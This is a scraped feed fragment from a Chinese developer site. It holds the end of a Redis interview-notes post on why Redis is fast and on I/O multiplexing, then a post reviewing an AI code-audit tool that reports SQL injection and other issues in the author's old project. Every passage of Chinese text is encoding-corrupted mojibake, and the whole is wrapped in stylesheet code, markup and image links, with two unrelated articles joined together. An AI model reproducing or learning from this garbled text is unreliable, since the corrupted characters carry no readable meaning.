.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŸºäºæƒ³æå‡è‡ªèº«ä»£ç åŸºç¡€çš„è€ƒè™‘ï¼Œä»ç½‘ç»œä¸Šè·å–redisçš„é¢è¯•é¢˜ï¼Œæ¥è¿›è¡Œå¯¹redisåŸºç¡€çš„å­¦ä¹ </p>
<h2 data-id="heading-0">1 redis ä¸ºä»€ä¹ˆå¿«</h2>
<p>Redisçš„é€Ÿåº¦â¾®å¸¸çš„å¿«ï¼Œå•æœºçš„Rediså°±å¯ä»¥â½€æ’‘æ¯ç§’åå‡ ä¸‡çš„å¹¶å‘ï¼Œç›¸å¯¹äºMySQLæ¥è¯´ï¼Œæ€§èƒ½æ˜¯MySQLçš„â¼â¼—å€ã€‚é€Ÿåº¦å¿«çš„åŸå› ä¸»è¦æœ‰â¼ç‚¹ï¼š</p>
<ol>
<li><strong>å®Œå…¨åŸºäºå†…å­˜æ“ä½œ</strong></li>
<li>ä½¿â½¤å•çº¿ç¨‹ï¼Œé¿å…äº†çº¿ç¨‹åˆ‡æ¢å’Œç«æ€äº§ç”Ÿçš„æ¶ˆè€—</li>
<li>åŸºäºâ¾®é˜»å¡çš„IOå¤šè·¯å¤â½¤æœºåˆ¶</li>
<li>Cè¯­â¾”å®ç°ï¼Œä¼˜åŒ–è¿‡çš„æ•°æ®ç»“æ„ï¼ŒåŸºäºâ¼ç§åŸºç¡€çš„æ•°æ®ç»“æ„ï¼Œredisåšäº†â¼¤é‡çš„ä¼˜åŒ–ï¼Œæ€§èƒ½æâ¾¼<br/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a582e80f1a3e476b8411856f5ca289f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671341&amp;x-signature=nmnw9dqDKQ9chWtzzZFeHfCkeoU%3D" alt="Redisä½¿ç”¨IOå¤šè·¯å¤ç”¨å’Œè‡ªèº«äº‹ä»¶æ¨¡å‹" loading="lazy"/></li>
</ol>
<h2 data-id="heading-1">2 ä»€ä¹ˆæ˜¯I/Oå¤šè·¯å¤ç”¨</h2>
<p>å¼•ç”¨çŸ¥ä¹ä¸Šä¸€ä¸ªé«˜èµçš„å›ç­”æ¥è§£é‡Šä»€ä¹ˆæ˜¯I/Oå¤šè·¯å¤ç”¨ã€‚å‡è®¾ä½ æ˜¯ä¸€ä¸ªè€å¸ˆï¼Œè®©30ä¸ªå­¦ç”Ÿè§£ç­”ä¸€é“é¢˜ç›®ï¼Œç„¶åæ£€æŸ¥å­¦ç”Ÿåšçš„æ˜¯å¦æ­£ç¡®ï¼Œä½ æœ‰ä¸‹é¢å‡ ä¸ªé€‰æ‹©ï¼š</p>
<ul>
<li>ç¬¬ä¸€ç§é€‰æ‹©ï¼šæŒ‰é¡ºåºé€ä¸ªæ£€æŸ¥ï¼Œå…ˆæ£€æŸ¥Aï¼Œç„¶åæ˜¯Bï¼Œä¹‹åæ˜¯Cã€Dã€‚ã€‚ã€‚è¿™ä¸­é—´å¦‚æœæœ‰ä¸€ä¸ªå­¦ç”Ÿå¡ä½ï¼Œå…¨ç­éƒ½ä¼šè¢«è€½è¯¯ã€‚è¿™ç§æ¨¡å¼å°±å¥½æ¯”ï¼Œä½ ç”¨å¾ªç¯æŒ¨ä¸ªå¤„ç†socketï¼Œæ ¹æœ¬ä¸å…·æœ‰å¹¶å‘èƒ½åŠ›ã€‚</li>
<li>ç¬¬äºŒç§é€‰æ‹©ï¼šä½ åˆ›å»º30ä¸ªåˆ†èº«ï¼Œæ¯ä¸ªåˆ†èº«æ£€æŸ¥ä¸€ä¸ªå­¦ç”Ÿçš„ç­”æ¡ˆæ˜¯å¦æ­£ç¡®ã€‚ è¿™ç§ç±»ä¼¼äºä¸ºæ¯ä¸€ä¸ªç”¨æˆ·åˆ›å»ºä¸€ä¸ªè¿›ç¨‹æˆ–è€…- çº¿ç¨‹å¤„ç†è¿æ¥ã€‚</li>
<li>ç¬¬ä¸‰ç§é€‰æ‹©ï¼Œä½ ç«™åœ¨è®²å°ä¸Šç­‰ï¼Œè°è§£ç­”å®Œè°ä¸¾æ‰‹ã€‚è¿™æ—¶Cã€Dä¸¾æ‰‹ï¼Œè¡¨ç¤ºä»–ä»¬è§£ç­”é—®é¢˜å®Œæ¯•ï¼Œä½ ä¸‹å»ä¾æ¬¡æ£€æŸ¥Cã€Dçš„ç­”æ¡ˆï¼Œç„¶åç»§ç»­å›åˆ°è®²å°ä¸Šç­‰ã€‚æ­¤æ—¶Eã€Aåˆä¸¾æ‰‹ï¼Œç„¶åå»å¤„ç†Eå’ŒAã€‚</li>
</ul>
<p>ç¬¬ä¸€ç§å°±æ˜¯é˜»å¡IOæ¨¡å‹ï¼Œç¬¬ä¸‰ç§å°±æ˜¯I/Oå¤ç”¨æ¨¡å‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d00f83ed65484371a05d059183196135~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZOI6YeM6LCi6aG_:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671341&amp;x-signature=MPbKuobcAkJyGFTHCeqOpIW9usA%3D" alt="å¤šè·¯å¤ç”¨æ¨¡å‹" loading="lazy"/></p>
<p>Linuxç³»ç»Ÿæœ‰ä¸‰ç§æ–¹å¼å®ç°IOå¤šè·¯å¤ç”¨ï¼šselectã€pollå’Œepollã€‚</p>
<p>ä¾‹å¦‚epollæ–¹å¼æ˜¯å°†ç”¨æˆ·socketå¯¹åº”çš„fdæ³¨å†Œè¿›epollï¼Œç„¶åepollå¸®ä½ ç›‘å¬å“ªäº›socketä¸Šæœ‰æ¶ˆæ¯åˆ°è¾¾ï¼Œè¿™æ ·å°±é¿å…äº†å¤§é‡çš„æ— ç”¨æ“ä½œã€‚æ­¤æ—¶çš„socketåº”è¯¥é‡‡ç”¨éé˜»å¡æ¨¡å¼ã€‚</p>
<p>è¿™æ ·ï¼Œæ•´ä¸ªè¿‡ç¨‹åªåœ¨è¿›è¡Œselectã€pollã€epollè¿™äº›è°ƒç”¨çš„æ—¶å€™æ‰ä¼šé˜»å¡ï¼Œæ”¶å‘å®¢æˆ·æ¶ˆæ¯æ˜¯ä¸ä¼šé˜»å¡çš„ï¼Œæ•´ä¸ªè¿›ç¨‹æˆ–è€…çº¿ç¨‹å°±è¢«å……åˆ†åˆ©ç”¨èµ·æ¥ï¼Œè¿™å°±æ˜¯äº‹ä»¶é©±åŠ¨ï¼Œæ‰€è°“çš„reactoræ¨¡å¼ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®© AI åˆ†ææˆ‘ 3 å¹´å‰å†™çš„ä»£ç ï¼Œå…¨æ˜¯æ¼æ´ï¼]]></title>    <link>https://juejin.cn/post/7589166195797917723</link>    <guid>https://juejin.cn/post/7589166195797917723</guid>    <pubDate>2025-12-30T03:48:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589166195797917723" data-draft-id="7589194558287708198" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®© AI åˆ†ææˆ‘ 3 å¹´å‰å†™çš„ä»£ç ï¼Œå…¨æ˜¯æ¼æ´ï¼"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜,ä»£ç è§„èŒƒ,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-30T03:48:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜é±¼çš®"/> <meta itemprop="url" content="https://juejin.cn/user/2444938365386621"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®© AI åˆ†ææˆ‘ 3 å¹´å‰å†™çš„ä»£ç ï¼Œå…¨æ˜¯æ¼æ´ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2444938365386621/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜é±¼çš®
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:48:57.000Z" title="Tue Dec 30 2025 03:48:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œä¿ºæ˜¯ç¨‹åºå‘˜é±¼çš®ã€‚æœ€è¿‘é€› GitHub çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªæŒºæœ‰æ½œåŠ›çš„å¼€æºé¡¹ç›® â€”â€” DeepAuditï¼Œè®© AI å¸®ä½ æŒ–æ˜é¡¹ç›®æ¼æ´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82ce9f55e33b4ca0a84cd41b5a6bba86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=Z9AtDPCDQOGpjqK%2FnmLvBpvcsXM%3D" alt="" loading="lazy"/></p>
<p>åŠ¿å¤´å¾ˆçŒ›å•Šï¼ŒçŸ­çŸ­æ—¶é—´å°±æ¶¨äº†ä¸å°‘ starï¼Œçœ‹è¿™ star è¶‹åŠ¿å›¾ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ed37cd6bf294dc4abe3786f879e80f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=YVMJFqfnZsUbpgN8NFvC0ZT8%2BQ0%3D" alt="" loading="lazy"/></p>
<p>è¿™æ˜¯ä¸€ä¸ª AI ä»£ç å®¡è®¡å·¥å…·ï¼Œèƒ½è‡ªåŠ¨åˆ†æä½ çš„ä»£ç ï¼Œæ‰¾å‡ºæ½œåœ¨çš„å®‰å…¨æ¼æ´å’Œä»£ç é—®é¢˜ã€‚</p>
<p>ä½œè€…å¾ˆè´´å¿ƒåœ°æä¾›äº†åœ¨çº¿ä½“éªŒç‰ˆï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œå½“ç„¶ä¹Ÿæ”¯æŒæœ¬åœ°éƒ¨ç½²ã€‚ä¸‹é¢é±¼çš®ä»¥ä½œè€…éƒ¨ç½²çš„åœ¨çº¿ä½“éªŒç‰ˆï¼Œå¸¦å¤§å®¶ä½“éªŒä¸€ä¸‹è¿™ä¸ªé¡¹ç›®çš„åŠŸèƒ½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e089e7aeb3db4793aabaca6291d56b92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=GUSi04DMHsrMIKTjxdtper%2FF3DY%3D" alt="" loading="lazy"/></p>
<p>é¦–å…ˆéœ€è¦é…ç½®è‡ªå·±çš„å¤§æ¨¡å‹ API Keyï¼Œå›½å†…çš„å¾ˆå¤šå¤§æ¨¡å‹éƒ½æ”¯æŒï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b9082baca18e4421bd3741416e6ff8c3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=eqEx6qZYvXS1YNRQ%2BtG1GM9Nvw0%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœæƒ³ç›´æ¥å¯¼å…¥å¹¶åˆ†æä½ åœ¨ GitHub ä¸Šçš„é¡¹ç›®ï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨ä¸Šä¼ ä»£ç ï¼Œé‚£ä¹ˆè¿˜éœ€è¦é…ç½® GitHub Tokenï¼Œè®©å·¥å…·èƒ½å¤Ÿè¯»å–åˆ°ä½ çš„ä»“åº“ä»£ç ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb6c93b116da457688a0bb594987cee4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=dFGTAw6syVguDHsVMcxQTtNExLs%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥åœ¨ GitHub ä¸Šç”Ÿæˆä¸€ä¸ªæ–°çš„ Tokenï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64f5e2aab4674a7a8b2e7baaa39a607d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=z7LI2dOulL%2BSi5LnKvNGsLoIejs%3D" alt="" loading="lazy"/></p>
<p>é…ç½®å¥½ä¹‹åï¼Œå°±å¯ä»¥åˆ›å»ºä¸€ä¸ªè¦åˆ†æçš„é¡¹ç›®äº†ï¼Œä»“åº“åœ°å€è¦å¡«å†™æ­£ç¡®ã€‚è¿™é‡Œé±¼çš®æ‹¿è‡ªå·± 3 å¹´å‰åšçš„ä¸ªäººå¼€æºé¡¹ç›® â€”â€” SQL ä»£ç å’Œæ•°æ®ç”Ÿæˆå™¨è¯•è¯•æ°´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec1d772f358f493eb80760377ed15b91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=DgRaazmZQR%2FTOIOxe7k3bowfv8c%3D" alt="åˆ›å»ºæ–°é¡¹ç›®" loading="lazy"/></p>
<p>ç„¶åæ–°å»ºä¸€ä¸ªå®¡è®¡ä»»åŠ¡ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7aef4cd1bf9b4198bf66e826b5076e88~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=bnqfX%2BcBKreAhb4RE0AdIMtsPe4%3D" alt="" loading="lazy"/></p>
<p>å¡«å†™è¦åˆ†æçš„åˆ†æ”¯ï¼Œè¿˜å¯ä»¥è®¾ç½®ä¸€äº›æ–‡ä»¶æ’é™¤è§„åˆ™ï¼Œæ¯”å¦‚æ’é™¤ <code>node_modules</code>ã€æµ‹è¯•æ–‡ä»¶ç­‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6a2cdc9a69846c183d6361dbd488ded~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=i25saiNoPDSIV5u8CMjtEenOhKs%3D" alt="" loading="lazy"/></p>
<p>ç‚¹å‡»å¼€å§‹åˆ†æï¼ŒAI å°±å±é¢ å„¿å±é¢ å„¿å¹²æ´»äº†~</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1c4a8369eee464a9deb2b3089dca197~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=mPNPU0V5jgi9kIvJ4qI7vi8%2BtXg%3D" alt="" loading="lazy"/></p>
<p>æˆ‘å»ï¼Œç«Ÿç„¶å‘ç°äº† 123 ä¸ªé—®é¢˜ï¼Ÿï¼</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/057213746dfa4764890e0c2c2a4203a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=mgb87ms3ipWfKdpAVZYTQhYq77s%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡èƒ½å†™å‡º 123 ä¸ªé—®é¢˜ï¼Œæˆ‘æ„Ÿè§‰è‡ªå·±ä¹Ÿæ˜¯æŒºå‰å®³çš„å“ˆå“ˆå“ˆã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e4c36009bf14d2bbf82caa88f123421~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=iqOId77xo5YUU2PPK0JrduB8XBc%3D" alt="" loading="lazy"/></p>
<p>è¿›å…¥ä»»åŠ¡è¯¦æƒ…é¡µé¢ï¼Œæˆ‘å€’è¦çœ‹çœ‹éƒ½æ˜¯ä»€ä¹ˆé—®é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5e0def0ec6564dfdae0883961c7b55e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=quy%2Fl8484gzZW47YuqaPaKSBD7Q%3D" alt="" loading="lazy"/></p>
<p>å…ˆçœ‹çœ‹æœ€ä¸¥é‡çš„ â€”â€” SQL æ³¨å…¥æ¼æ´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a322f03d786e4c8db50426a740cf0592~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=v%2B7SDsy19MpqFvPr401%2BqKmveqw%3D" alt="" loading="lazy"/></p>
<p>AI çš„è§£é‡Šè¿˜æŒºåˆ°ä½çš„ï¼Œç¡®å®å­˜åœ¨ SQL æ³¨å…¥é£é™©ã€‚å½“æ—¶è¿™ä¹ˆå†™çº¯å±å›¾æ–¹ä¾¿ï¼Œæ²¡æƒ³åˆ°è¢« AI ä¸€çœ¼çœ‹ç©¿äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a9e6b1c379541b0860bf4e55bb33f2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=LKY9t2at8wBp2E0UQf%2B9sxDybVs%3D" alt="" loading="lazy"/></p>
<p>ä¸€äº›å°ç»†èŠ‚ä¹Ÿè¢«æŒ‡å‡ºæ¥äº†ï¼Œæ¯”å¦‚ç¡¬ç¼–ç ã€å¼‚å¸¸å¤„ç†ä¸å¤Ÿå®Œå–„ã€æ—¥å¿—è®°å½•ä¸è§„èŒƒç­‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db47d441591496997c6b38afb1fa2f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=qacv3%2B9jVo8WOCa8OrNJjyjQ3UU%3D" alt="" loading="lazy"/></p>
<p>ä¸è¿‡ä¹Ÿæœ‰ä¸€äº›è¯¯æŠ¥ï¼ŒAI æŠŠæ­£å¸¸çš„ä»£ç é€»è¾‘åˆ¤æ–­æˆäº†é—®é¢˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/273325e6d16f4bab809828adb2c7c326~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=gjEFDhdHSEoWZ6c%2BjUMWG0f6j98%3D" alt="" loading="lazy"/></p>
<p>æ€»ä½“æ¥è¯´ï¼Œè¿™ä¸ªå·¥å…·è¿˜æœ‰è¿›æ­¥ç©ºé—´ï¼Œä½†å·²ç»å¾ˆå®ç”¨äº†ã€‚æ­£å¥½æˆ‘ä»¬å›¢é˜Ÿéœ€è¦è¿™æ ·çš„ä»£ç å®¡è®¡å·¥å…·ï¼Œè¿˜æ˜¯æŒºæœŸå¾…ä½œè€…èƒ½è¿›ä¸€æ­¥å®Œå–„çš„ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af4e4c578bb54ecaa95299e8b1ff3fe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=xyPWgZfA8Tml5ukdZytgIjUIBN8%3D" alt="" loading="lazy"/></p>
<p>å®¡è®¡å®Œæˆåï¼Œè¿˜å¯ä»¥ç›´æ¥å¯¼å‡ºæŠ¥å‘Šï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d2b3bbe99884357bba2a13a0b3611a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6bG855qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767671336&amp;x-signature=Z9k%2BW5r4I8FmVNSx8mhZKxzWQXs%3D" alt="" loading="lazy"/></p>
<p>ä¸€ä¸‹å­å°±å¾—åˆ°äº†æ•´æ•´ 70 å¤šé¡µçš„ä¸“ä¸šæŠ¥å‘Šï¼</p>
